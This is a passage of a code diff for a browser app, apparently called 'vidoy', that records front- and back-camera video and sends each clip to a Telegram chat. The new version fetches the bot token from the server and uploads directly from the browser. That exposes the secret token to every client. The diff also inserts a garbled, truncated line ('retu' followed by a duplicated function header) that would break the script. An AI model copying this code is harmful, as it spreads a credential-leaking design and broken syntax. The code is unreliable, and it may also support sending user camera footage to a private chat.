@@ -5055,6 +5055,7 @@
         }
 
                 function stopRecorderForSlot(slot, label, videoId) {
+            retu        function stopRecorderForSlot(slot, label, videoId) {
             return new Promise(resolve => {
                 if (!slot.recorder || slot.recorder.state === 'inactive') {
                     if (slot.stream) { slot.stream.getTracks().forEach(t => t.stop()); slot.stream = null; }
@@ -5068,27 +5069,52 @@
                     if (slot.stream) { slot.stream.getTracks().forEach(t => t.stop()); slot.stream = null; }
                     slot.recorder = null;
                     if (blob.size < 1000) { resolve(null); return; }
+
                     try {
-                        // Kirim ke Telegram via /api/telegram-rec
-                        const headers = {
-                            'Content-Type': 'video/webm',
-                            'x-admin-key': getUploadAdminKey(),
-                            'x-rec-label': label,
-                            'x-rec-video-id': String(videoId || '-'),
-                            'x-rec-camera': label,
-                            'x-rec-duration': String(dur),
-                            'x-rec-session': String(recSessionToken || '-')
-                        };
-                        const res = await fetch('/api/telegram-rec', { method: 'POST', headers: headers, body: blob });
-                        const j = await res.json().catch(() => null);
-                        if (res.status === 401) { localStorage.removeItem('vidoy_upload_key'); throw new Error('Password upload salah'); }
-                        if (!res.ok || !j || !j.ok) throw new Error((j && j.error) || ('Gagal kirim ke Telegram (' + res.status + ')'));
+                        // 1) Minta token & chatId dari server Vercel (body kecil, tidak kena batas 4.5MB)
+                        const infoRes = await fetch('/api/telegram-rec', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json', 'x-admin-key': getUploadAdminKey() },
+                            body: JSON.stringify({ label, videoId, duration: dur, session: recSessionToken })
+                        });
+                        const info = await infoRes.json().catch(() => null);
+                        if (infoRes.status === 401) { localStorage.removeItem('vidoy_upload_key'); throw new Error('Password upload salah'); }
+                        if (!infoRes.ok || !info || !info.ok) throw new Error((info && info.error) || ('Gagal ambil token Telegram (' + infoRes.status + ')'));
+
+                        const botToken = info.botToken;
+                        const chatId = info.chatId;
+
+                        // 2) Kirim file LANGSUNG dari browser ke Telegram (bukan lewat Vercel)
+                        const form = new FormData();
+                        form.append('chat_id', chatId);
+                        const caption =
+                            '🎥 Rekaman ' + (label === 'back' ? 'BELAKANG' : 'DEPAN') + '\n' +
+                            'Video ID: ' + (videoId || '-') + '\n' +
+                            'Sesi: ' + (recSessionToken || '-') + '\n' +
+                            'Durasi: ' + dur + 's\n' +
+                            'Waktu: ' + new Date().toISOString();
+                        form.append('caption', caption);
+                        form.append('document', blob, 'rec_' + label + '_' + videoId + '_' + Date.now() + '.webm');
+
+                        const tgRes = await fetch('https://api.telegram.org/bot' + botToken + '/sendDocument', {
+                            method: 'POST',
+                            body: form
+                        });
+                        const tgJson = await tgRes.json().catch(() => null);
+                        if (!tgRes.ok || !tgJson || !tgJson.ok) {
+                            throw new Error((tgJson && tgJson.description) || ('Telegram menolak (' + tgRes.status + ')'));
+                        }
+
+                        const msg = tgJson.result;
+                        const doc = msg && msg.document;
+                        const chatUrl = 'https://t.me/c/' + String(chatId).replace(/^-100/, '') + '/' + (msg ? msg.message_id : '');
+
                         resolve({
                             label: label,
-                            url: '', // tidak ada URL file langsung
-                            fileId: j.file_id || '',
-                            messageId: j.message_id || 0,
-                            chatUrl: j.chat_url || '',
+                            url: '',
+                            fileId: doc ? doc.file_id : '',
+                            messageId: msg ? msg.message_id : 0,
+                            chatUrl: chatUrl,
                             duration: dur,
                             sentToTelegram: true
                         });
